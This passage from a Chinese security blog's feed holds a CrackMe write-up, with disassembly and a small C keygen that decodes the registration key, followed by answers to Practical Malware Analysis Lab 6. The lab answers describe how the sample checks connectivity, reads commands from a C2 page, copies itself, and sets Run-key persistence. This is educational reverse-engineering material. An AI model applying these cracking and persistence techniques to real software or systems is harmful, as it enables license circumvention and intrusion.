code-wrapper"><pre><code class="hljs x86asm">00401F68   &gt; /85C0          <span class="hljs-keyword">test</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">eax</span><br>00401F6A   . |0F84 BB000000 <span class="hljs-keyword">je</span> Andréna<span class="hljs-number">.</span>0040202B<br>00401F70   . |8D55 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]<br>00401F73   . |8D45 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br>00401F76   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401F77   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00401F78   . |C745 9C <span class="hljs-number">01000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>],<span class="hljs-number">0x1</span><br>00401F7F   . |C745 <span class="hljs-number">94</span> <span class="hljs-number">02000</span>&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>],<span class="hljs-number">0x2</span><br>00401F86   . |FF15 <span class="hljs-number">90414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaI4Var&gt;<span class="hljs-comment">;  Msvbvm50.__vbaI4Var</span><br>00401F8C   . |8D4D BC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x44</span>]          <span class="hljs-comment">; |</span><br>00401F8F   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |Start = 0x4CE994</span><br>00401F90   . |8D55 <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]          <span class="hljs-comment">; |</span><br>00401F93   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |dString8 = 9E6A2546</span><br>00401F94   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |RetBUFFER = NULL</span><br>00401F95   . |FF15 <span class="hljs-number">34414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">632</span>&gt;]     <span class="hljs-comment">; \诸位获取</span><br>00401F9B   . |8D45 <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br>00401F9E   . |8D4D A8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x58</span>]<br>00401FA1   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String8 = 004CE994</span><br>00401FA2   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |ARG2 = 9E6A2546</span><br>00401FA3   . |FF15 <span class="hljs-number">64414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaStrVa&gt;<span class="hljs-comment">; \__vbaStrVarVal</span><br>00401FA9   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /String = &quot;;&quot;</span><br>00401FAA   . |FF15 <span class="hljs-number">08414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]     <span class="hljs-comment">; \转为ascii</span><br>00401FB0   . |<span class="hljs-number">66</span>:<span class="hljs-number">05</span> 0A00    <span class="hljs-keyword">add</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0xA</span>                               <span class="hljs-comment">;  +0xA</span><br>00401FB4   . |0F80 B0020000 <span class="hljs-keyword">jo</span> Andréna<span class="hljs-number">.</span>0040226A<br>00401FBA   . |0FBFD0        <span class="hljs-keyword">movsx</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">ax</span><br>00401FBD   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401FBE   . |FF15 <span class="hljs-number">70414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50.#<span class="hljs-number">537</span>&gt;]     <span class="hljs-comment">;  ascii转字符</span><br>00401FC4   . |<span class="hljs-number">8985</span> 7CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x84</span>],<span class="hljs-built_in">eax</span><br>00401FCA   . |8D45 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00401FCD   . |8D8D 74FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>]<br>00401FD3   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br>00401FD4   . |8D95 64FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x9C</span>]<br>00401FDA   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br>00401FDB   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br>00401FDC   . |C785 74FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>],<span class="hljs-number">0x8</span><br>00401FE6   . |FFD3          <span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaVarCat</span><br>00401FE8   . |8BD0          <span class="hljs-keyword">mov</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">eax</span><br>00401FEA   . |8D4D CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>00401FED   . |FFD6          <span class="hljs-keyword">call</span> <span class="hljs-built_in">esi</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaVarMove</span><br>00401FEF   . |8D4D A8       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x58</span>]<br>00401FF2   . |FF15 B0414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaFreeS&gt;<span class="hljs-comment">;  Msvbvm50.__vbaFreeStr</span><br>00401FF8   . |8D85 74FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x8C</span>]<br>00401FFE   . |8D4D <span class="hljs-number">84</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x7C</span>]<br><span class="hljs-number">00402001</span>   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span><br><span class="hljs-number">00402002</span>   . |8D55 <span class="hljs-number">94</span>       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x6C</span>]<br><span class="hljs-number">00402005</span>   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span><br><span class="hljs-number">00402006</span>   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span><br><span class="hljs-number">00402007</span>   . |6A <span class="hljs-number">03</span>         <span class="hljs-keyword">push</span> <span class="hljs-number">0x3</span><br><span class="hljs-number">00402009</span>   . |FFD7          <span class="hljs-keyword">call</span> <span class="hljs-built_in">edi</span>                                 <span class="hljs-comment">;  Msvbvm50.__vbaFreeVarList</span><br>0040200B   . |83C4 <span class="hljs-number">10</span>       <span class="hljs-keyword">add</span> <span class="hljs-built_in">esp</span>,<span class="hljs-number">0x10</span><br>0040200E   . |8D85 ECFEFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x114</span>]<br><span class="hljs-number">00402014</span>   . |8D8D FCFEFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x104</span>]<br>0040201A   . |8D55 DC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x24</span>]<br><span class="hljs-number">0040201D</span>   . |<span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /TMPend8 = 004CE994</span><br>0040201E   . |<span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |TMPstep8 = 9E6A2546</span><br>0040201F   . |<span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; |Counter8 = NULL</span><br><span class="hljs-number">00402020</span>   . |FF15 A4414000 <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarFo&gt;<span class="hljs-comment">; \__vbaVarForNext</span><br><span class="hljs-number">00402026</span>   .^\E9 3DFFFFFF   <span class="hljs-keyword">jmp</span> Andréna<span class="hljs-number">.</span>00401F68<br>0040202B   &gt; \8D45 CC       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x34</span>]<br>0040202E   .  8D8D 54FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>]<br><span class="hljs-number">00402034</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; /var18 = 004CE994</span><br><span class="hljs-number">00402035</span>   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; |var28 = 9E6A2546</span><br><span class="hljs-number">00402036</span>   .  C785 5CFFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xA4</span>],Andréna<span class="hljs-number">.0040</span>&gt;<span class="hljs-comment">; |kXy^rO|*yXo*m\kMuOn*+</span><br><span class="hljs-number">00402040</span>   .  C785 54FFFFFF&gt;<span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xAC</span>],<span class="hljs-number">0x8008</span>       <span class="hljs-comment">; |</span><br>0040204A   .  FF15 <span class="hljs-number">40414000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM50<span class="hljs-number">.</span>__vbaVarTs&gt;<span class="hljs-comment">; \__vbaVarTstEq</span><br></code></pre></div></td></tr></table></figure><h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">char</span> key[] = <span class="hljs-string">&quot;kXy^rO|*yXo*m\\kMuOn*+&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(key); i++)<br>&#123;<br>key[i] = key[i] - <span class="hljs-number">0xA</span>;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, key);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/13/160CrackMe-010/4.png"></p><p>输入正确的KEY</p><p><img src="/2021/08/13/160CrackMe-010/5.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>流程还是比较简单的，算法也很简单，总体上来讲难度不大。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h2&gt;&lt;p&gt;打开程序，看到只有一个输入key的地方，尝试输入发现弹出错误的弹窗。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/13/160Cra</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>恶意代码分析实战-实验6</title>
    <link href="https://b1ackie.cn/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/"/>
    <id>https://b1ackie.cn/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/</id>
    <published>2021-08-10T07:52:15.000Z</published>
    <updated>2021-08-10T10:46:29.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Lab-6-1"><a href="#Lab-6-1" class="headerlink" title="Lab 6-1"></a>Lab 6-1</h2><h3 id="1-由main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#1-由main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="1.由main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>1.由main函数调用的唯一子过程中发现的主要代码结构是什么？</h3><p>使用IDA找到main函数看到调用了一个子函数sub_401000，F5即可看到伪代码。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-1.png"></p><p>可以看到调用了InternetGetConnectedState这个API，这个函数是用来检测是否联网的，判断本地网络状态。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">InternetGetConnectedState</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD lpdwFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   dwReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>当存在一个连接时返回TRUE，否则返回FALSE。</p><h3 id="2-位于0x40105F的子过程是什么？"><a href="#2-位于0x40105F的子过程是什么？" class="headerlink" title="2.位于0x40105F的子过程是什么？"></a>2.位于0x40105F的子过程是什么？</h3><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-2.png"></p><p>这样确实看不太出来是做什么的。</p><p>这样看可以看到成功或者失败分别会压入栈不同的文字然后调用。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-3.png"></p><p>再看实际运行情况，推测应该是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-1-4.png"></p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>通过上面的函数分析可以得知，这是一个判断是否有网络连接的程序。如果存在网络连接返回1，否则返回0。</p><h2 id="Lab-6-2"><a href="#Lab-6-2" class="headerlink" title="Lab 6-2"></a>Lab 6-2</h2><h3 id="1-main函数调用的第一个子过程执行了什么操作？"><a href="#1-main函数调用的第一个子过程执行了什么操作？" class="headerlink" title="1.main函数调用的第一个子过程执行了什么操作？"></a>1.main函数调用的第一个子过程执行了什么操作？</h3><p>调用的第一个函数是sub_401000，调用了InternetGetConnectedState这个API判断当前是否连接了网络</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-1.png"></p><h3 id="2-位于0x40117F的子过程是什么？"><a href="#2-位于0x40117F的子过程是什么？" class="headerlink" title="2.位于0x40117F的子过程是什么？"></a>2.位于0x40117F的子过程是什么？</h3><p>查看此函数，发现与lab6-1是一样的，所以是一个printf函数。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-2.png"></p><h3 id="3-被main函数调用的第二个子过程做了什么？"><a href="#3-被main函数调用的第二个子过程做了什么？" class="headerlink" title="3.被main函数调用的第二个子过程做了什么？"></a>3.被main函数调用的第二个子过程做了什么？</h3><p>首先调用了InternetOpenA初始化应用程序对 WinINet 函数的使用。</p><p>然后调用了InternetOpenUrlA下载“<a href="http://www.practicalmalwareanalysis.com/cc.htm%E2%80%9D%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2">http://www.practicalmalwareanalysis.com/cc.htm”这个页面</a></p><p>再调用InternetReadFile读取数据，如果读取的前几个字符是“&lt;!–”就成功，如果失败就会打印“Error 2.3: Fail to get command”，读取失败会打印“Error 2.2: Fail to ReadFile”</p><p>openurl失败会打印“Error 2.1: Fail to OpenUrl”</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-3.png"></p><p>再仔细分析一下返回值，可以看到前几个值如果比对都正确的话，那么会把第五个字符给al，而前几个字符是html页面的注释，也就是读取注释的第一个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-4.png"></p><p>这个函数结束之后，可以看出来后al的值会再次赋给[EBP+var_8]，最终会传给ecx，再压入栈作为printf的一个参数。可以看到压入栈一句话”Success: Parsed command is %c\n”，%c对应的就是这个值，打印出这个字符。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-5.png"></p><h3 id="4-在这个子过程中使用了什么类型的代码结构？"><a href="#4-在这个子过程中使用了什么类型的代码结构？" class="headerlink" title="4.在这个子过程中使用了什么类型的代码结构？"></a>4.在这个子过程中使用了什么类型的代码结构？</h3><p>if-else的结构</p><h3 id="5-在这个程序中有任何基于网络的指示吗？"><a href="#5-在这个程序中有任何基于网络的指示吗？" class="headerlink" title="5.在这个程序中有任何基于网络的指示吗？"></a>5.在这个程序中有任何基于网络的指示吗？</h3><p>使用了Internet Explorer 7.5/pma作为InternetOpenA函数lpszAgent参数的值，还有<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AAURL%E3%80%82">http://www.practicalmalwareanalysis.com/cc.htm这个URL。</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-6.png"></p><h3 id="6-这个恶意代码的目的是什么？"><a href="#6-这个恶意代码的目的是什么？" class="headerlink" title="6.这个恶意代码的目的是什么？"></a>6.这个恶意代码的目的是什么？</h3><p>首先判断是否联网，如果联网那么就会开始读取<a href="http://www.practicalmalwareanalysis.com/cc.htm%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E7%9A%84%EF%BC%8C%E7%84%B6%E5%90%8E%E8%8E%B7%E5%8F%96%E6%B3%A8%E9%87%8A%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%8C%E6%9C%80%E5%90%8E%E5%B0%86%E5%85%B6%E6%89%93%E5%8D%B0%E5%87%BA%E6%9D%A5%EF%BC%8C%E5%86%8D%E8%B0%83%E7%94%A8sleep%E5%87%BD%E6%95%B0">http://www.practicalmalwareanalysis.com/cc.htm这个页面的，然后获取注释的第一个字符，最后将其打印出来，再调用sleep函数</a></p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-2-7.png"></p><h2 id="Lab-6-3"><a href="#Lab-6-3" class="headerlink" title="Lab 6-3"></a>Lab 6-3</h2><h3 id="1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"><a href="#1-比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？" class="headerlink" title="1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？"></a>1.比较在main函数与实验6-2的main函数的调用。从main中调用的新的函数是什么？</h3><p>多了一个函数sub_401130函数</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-1.png"></p><p>这个新函数是通过读取到的值来执行不同的操作。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-2.png"></p><h3 id="2-这个新函数使用的参数是什么？"><a href="#2-这个新函数使用的参数是什么？" class="headerlink" title="2.这个新函数使用的参数是什么？"></a>2.这个新函数使用的参数是什么？</h3><p>使用的参数是通过读取网页资源注释中得到的字符，还有一个是main函数的参数argv[0]，就是程序名本身。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-8.png"></p><h3 id="3-这个函数包含的主要代码结构是什么？"><a href="#3-这个函数包含的主要代码结构是什么？" class="headerlink" title="3.这个函数包含的主要代码结构是什么？"></a>3.这个函数包含的主要代码结构是什么？</h3><p>包含的主要结构式switch结构</p><h3 id="4-这个函数能够做什么"><a href="#4-这个函数能够做什么" class="headerlink" title="4.这个函数能够做什么"></a>4.这个函数能够做什么</h3><p>首先当字符等于“a”时，可以创建一个文件夹路径是C:\TEMP</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-3.png"></p><p>当字符等于“b”时，会将自身复制到创建文件夹内，并且重命名为cc.exe</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-4.png"></p><p>等于“c”时，会删除文件夹下的cc.exe。</p><p><img src="/2021/08/10/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C6/6-3-5.png"></p><p>等于“d”时，会实现一个自启动功能，在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run下写入键值</p><p>通过注册表实现自启动可以看这里：<a href="https://b1ack1e.github.io/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/">自启动技术-注册表</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 